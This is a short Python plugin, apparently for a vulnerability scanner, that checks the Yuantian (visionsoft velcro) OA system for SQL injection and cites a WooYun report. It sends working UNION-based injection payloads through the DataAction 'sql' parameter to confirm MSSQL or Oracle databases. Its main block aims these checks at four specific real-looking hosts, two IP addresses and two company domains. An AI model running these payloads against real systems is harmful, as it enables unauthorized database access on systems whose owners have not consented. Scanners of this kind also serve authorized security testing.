#!/usr/bin/evn python
#-*-:coding:utf-8 -*-

#Author:404
#Name:源天软件OA通用型SQL注入漏洞(mssql and Oracle)
#Refer:http://www.wooyun.org/bugs/wooyun-2010-0128521


def assign(service,arg):
    if service=="visionsoft_velcro":
        return True,arg 
   
def  audit(arg):
    #mssql
    url=arg+"ServiceAction/com.velcro.base.DataAction?sql=|20select|20categoryids|20from|20project|20where|20id=%27%27%20and%201=2%20union%20all%20select%20sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271%27))&isworkflow=true"
    code,head,res,errcode,finalurl=curl.curl2(url)
    if code==200 and  "c4ca4238a0b923820dcc509a6f75849b"  in res:
        security_hole('SQL injection  MsSql: '+url)
     #Oracle   
    else:
        url=arg+"ServiceAction/com.velcro.base.DataAction?sql=|20select|20categoryids|20from|20project|20where|20id=''%20and%201=2%20union%20all%20select%20(select%20banner%20from%20sys.v_$version%20where%20rownum=1)%20from%20dual&isworkflow=trueE）"
        code,head,res,errcode,finalurl=curl.curl2(url)
        if code==200 and  "Oracle Database"  in res:
            security_hole('SQL injection  Oracle: '+url)  

if __name__=="__main__":
    from dummy import *
    audit(assign('visionsoft_velcro','http://60.12.113.234:8080/')[1])
    audit(assign('visionsoft_velcro','http://218.246.22.194:8080/')[1])
    audit(assign('visionsoft_velcro','http://winshare.com.cn/')[1])
    audit(assign('visionsoft_velcro','http://oa.mcds.com/')[1])